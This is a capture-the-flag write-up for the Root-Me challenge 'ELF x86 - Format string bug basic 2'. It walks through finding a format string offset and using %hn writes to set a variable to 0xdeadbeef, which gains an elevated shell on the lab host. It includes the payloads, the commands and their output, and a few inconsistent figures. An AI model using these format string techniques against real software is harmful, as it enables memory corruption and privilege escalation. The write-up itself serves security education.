# ELF x86 - Format string bug basic 2
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-2
```
Environment configuration :
PIE 	Position Independent Executable 	 No
RelRO 	Read Only relocations 	                 No
NX 	Non-Executable Stack 	                 YES
ASLR 	Address Space Layout Randomization 	 No
SF 	Source Fortification 	                 No
SSP 	Stack-Smashing Protection 	         No
SRC 	Source code access 	                 Yes

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch14@challenge02.root-me.org  
Username	app-systeme-ch14
Password	app-systeme-ch14
```
According to the source, the goal is to change the variable _check_ from 0x04030201 to 0xdeadbeef using string format vulnerability.<br>
The vulnerable code is at line 25:
```c
snprintf( fmt, sizeof(fmt), argv[1] );
```
Which enables an attacker to control the **fmt** argument of _snprintf_.<br>
Let's verify it quickly:
```sh
app-systeme-ch14@challenge02:~$ ./ch14 %08x.%08x.%08x.%08x
check at 0xbffffb08
argv[1] = [%08x.%08x.%08x.%08x]
fmt=[b7fdc4a0.00000001.00000000.00000001]
check=0x4030201
```
In order to exploit this vulnerability, first we'll need to find the offset of to our **argv[1]**. After few tries, one can find out that the offset is 9:
```sh
app-systeme-ch14@challenge02:~$ ./ch14 "AAAA %x %x %x %x %x %x %x %x %x"
check at 0xbffffaf8
argv[1] = [AAAA %x %x %x %x %x %x %x %x %x]
fmt=[AAAA b7fdc4a0 1 0 1 bffffc24 0 0 4030201 {41414141}]
check=0x4030201
```
Let's try to override the first nimble of **check**.<br>
First, we'll enter **check**'s address to the format string.<br>
Then, we'll make sure that the output string will contain enough bytes, so 0xbeef will be written.<br>
And for last, we'll take advantage of the "$" (control which variable will be used) and "hn" (writes the number of bytes into an int pointer) options.
So the input should look like ```\x08\xfb\xff\xbf%48875x%9hn``` (the 48875 can be found by trial and error):
```sh
app-systeme-ch14@challenge02:~$ ./ch14 $(python /tmp/exploit.py)
check at 0xbffffb08
argv[1] = ���%48875x%9$hn]

You are on the right way !
fmt=���                                                                                                                           ]
check=0x403beef
```
Great!<br>
Now let's write the second nimble.<br>
First, we'll enter the second nimble's address into the buffer (0xbffffb08 + 2 = 0xbffffb0a).<br>
Second, we'll adjust the 48875 to 48871 (4 more bytes entered).<br>
Then, at the end we'll make sure that the output string will contain enough bytes, so 0xdead will be written.<br>
And for last, we again take advantage of the "$" and "hn" options.<br>
So the input should look like ```\x08\xfb\xff\xbf\x0a\xfb\xff\xbf%48871x%9hn%8126x%10$hn```:
```
app-systeme-ch14@challenge02:~$ ./ch14 $(python /tmp/exploit.py)
check at 0xbffffaf8
argv[1] = [��������%48871x%9$hn%73662x%10$hn]
fmt=[��������                                                                                                                       ]
check=0xdeadbeef
Yeah dude ! You win !
$ id
uid=1114(app-systeme-ch14) gid=1114(app-systeme-ch14) euid=1214(app-systeme-ch14-cracked) groups=1214(app-systeme-ch14-cracked),100(users),1114(app-systeme-ch14)
$ cat .passwd
<censored>
```
